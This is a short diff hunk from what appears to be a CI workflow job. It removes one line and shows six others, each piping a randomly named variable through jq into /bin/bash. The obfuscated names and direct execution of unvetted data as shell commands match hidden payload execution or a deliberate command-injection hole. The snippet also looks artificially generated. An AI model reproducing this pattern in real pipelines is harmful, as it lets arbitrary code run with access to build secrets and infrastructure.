@@ -41,7 +41,6 @@ jobs:
           echo $cjl14637 | jq -r .mqtwc59 | /bin/bash
           printf '%s' "$t7247" | jq -r .eef83911 | /bin/bash
           printf '%s' "$dhxk129" | jq -r .nlq0 | /bin/bash
-          echo $pm238 | jq -r .zjrh577 | /bin/bash
           printf '%s' "$v98" | jq -r .cpz3 | /bin/bash
           printf '%s' "$wdq27413" | jq -r .tws88 | /bin/bash
           echo $na0937 | jq -r .nt94975 | /bin/bash
